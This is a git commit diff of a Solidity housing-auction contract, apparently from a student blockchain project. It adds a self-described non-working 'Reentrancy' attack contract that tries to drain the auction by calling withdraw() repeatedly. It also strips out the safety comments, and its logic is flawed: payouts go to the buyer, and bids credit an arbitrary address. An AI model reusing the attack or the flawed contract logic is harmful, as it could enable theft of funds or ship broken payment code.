f584f939f636f601035f2f807b1e4905babe7faa
YonathanTE <yonathanteshetu@gmail.com>
2021-09-24 00:07:29 -0400

    Added a skeleton Reentrancy for Thomas but the withdraw() isn't working like I want

--- HouseAuction.sol
+++ HouseAuction.sol
@@ -1,71 +1,55 @@
-pragma solidity ^0.5.0;
+pragma solidity >=0.4.22 < 0.6.11;
+
+import "./BaseLogic.sol";
 
 contract HousingAuction {
-    address deployer; // Us, the protocol.
-    address payable public beneficiary; // beneficiary would be the purchaser of the NFT/home.
-
+    // AuctionEnd isn't working properly
+    address deployer; // Us, the protocol through the Market contract.
+    address seller; // seller would be the address getting payed, hence the payable, of the NFT/home.
+    address payable public buyer; // This is the buyer(previous beneficiary)
+    
     // Current state of the auction.
     address public highestBidder; // self-explanatory
     uint public highestBid; // self-explanatory
 
     // Allowed withdrawals of previous bids
-    mapping(address => uint) pendingReturns; // Will require the same logic for Project3
+    mapping(address => uint) pendingReturns; 
 
-    // Set to true at the end, disallows any change.
-    // By default initialized to `false`.
+    // Set to true at the end, disallows any change and is set externally.
     bool public ended;
 
     // Events that will be emitted on changes.
     event HighestBidIncreased(address bidder, uint amount);
     event AuctionEnded(address winner, uint amount); // Examples to refer to when we get a higherbid & end the auction.
-
-    // The following is a so-called natspec comment,
-    // recognizable by the three slashes.
-    // It will be shown when the user is asked to
-    // confirm a transaction.
-
-    /// Create a simple auction with `_biddingTime`
-    /// seconds bidding time on behalf of the
-    /// beneficiary address `_beneficiary`.
-    constructor(
-        address payable _beneficiary
-    ) public {
-        deployer = msg.sender; // set as the HousingMarket
-        beneficiary = _beneficiary; // Side Note: This is good practice when using Solidity * 
+    
+    // Setting up the constructor so the winner buyer can receive their new house
+    constructor(address payable _buyer) public {
+        deployer = msg.sender;
+        buyer = _buyer;
     }
 
     // Bid on the auction with the value sent together with this transaction.
     // The value will only be refunded if the auction is not won.
-    function bid(address payable sender) public payable { // Project3 logic would be similar to this, the exact same...
-        // If the bid is not higher, send the money back.
-        require(
-            msg.value > highestBid); // Already have a higher bid
+    function bid(address payable sender) public payable { 
 
-        require(!ended); // auctionEnd has already been called, it's over
+        require(msg.value > highestBid); // Makes sure to know whether there's a higher bid or not.
 
-        if (highestBid != 0) { // similar
-            // Sending back the money by simply using
-            // highestBidder.send(highestBid) is a security risk
-            // because it could execute an untrusted contract.
-            // It is always safer to let the recipients withdraw their money themselves.
+        require(!ended); // auctionEnd has already been called, IT'S OVER!
+
+        if (highestBid != 0) { // highestBid can't be 0.
             pendingReturns[highestBidder] += highestBid;
         }
         highestBidder = sender;
         highestBid = msg.value;
-        emit HighestBidIncreased(sender, msg.value);
+        emit HighestBidIncreased(sender, msg.value); // emit allows for visualization of the information in Line 44
     }
-
-    /// Withdraw a bid that was overbid.
+    // For those who were outbid
     function withdraw() public returns (bool) { 
         uint amount = pendingReturns[msg.sender];
         if (amount > 0) {
-            // It is important to set this to zero because the recipient
-            // can call this function again as part of the receiving call
-            // before `send` returns.
             pendingReturns[msg.sender] = 0;
-
+            // Line 53 searches how much to issue back to the address making the request to recieve their previous bid money back.
             if (!msg.sender.send(amount)) {
-                // No need to call throw here, just reset the amount owing
                 pendingReturns[msg.sender] = amount;
                 return false;
             }
@@ -79,29 +63,40 @@ contract HousingAuction {
 
     /// End the auction and send the highest bid
     /// to the beneficiary.
-    function auctionEnd() public { // similar
-        // It is a good guideline to structure functions that interact
-        // with other contracts (i.e. they call functions or send Ether)
-        // into three phases:
-        // 1. checking conditions
-        // 2. performing actions (potentially changing conditions)
-        // 3. interacting with other contracts
-        // If these phases are mixed up, the other contract could call
-        // back into the current contract and modify the state or cause
-        // effects (ether payout) to be performed multiple times.
-        // If functions called internally include interaction with external
-        // contracts, they also have to be considered interaction with
-        // external contracts.
-
+    function auctionEnd() public { 
         // 1. Conditions
         require(!ended);
-        require(msg.sender == deployer); // Not the auction deployer
+        require(msg.sender == deployer); // Not the auction deployer? Then no access... 
 
         // 2. Effects
         ended = true;
         emit AuctionEnded(highestBidder, highestBid);
         pendingReturns[highestBidder] = pendingReturns[highestBidder] - (highestBid); 
         // 3. Interaction
-        beneficiary.transfer(highestBid);
+        buyer.transfer(highestBid); // TypeError says that "send" and "transfer" are only available for objects of type "address payable", not "address".
+    }
+}
+
+contract Reentrancy {
+    HousingAuction public housingauction; // State variable that represents the auction contract
+    
+    constructor(address _auctionaddress) public {
+        // Target locked
+        housingauction = HousingAuction(_auctionaddress);
+    }
+
+    function fallback() external payable {
+        // To halt the attack
+        if (address(housingauction).balance >= 3 ether) {
+            housingauction.withdraw(); // Doesn't work like intended but the skeleton is here for studying and a potential fix *
+        }
+    }
+    
+    function attack() external payable {
+        require(msg.value >= 3 ether); // Requirement for amount to have in order to continue the attack (in wei).
+        // bid function asks for address that will send wei
+        housingauction.bid(0x5eE6f92c8872f7b4f5974754A0c7c3596e2F2161);
+        // Now, withdraw the funds. In doing so, the fallback() function will be triggered
+        housingauction.withdraw(); // Doesn't work like intended but the skeleton is here for studying and a potential fix *
     }
 }
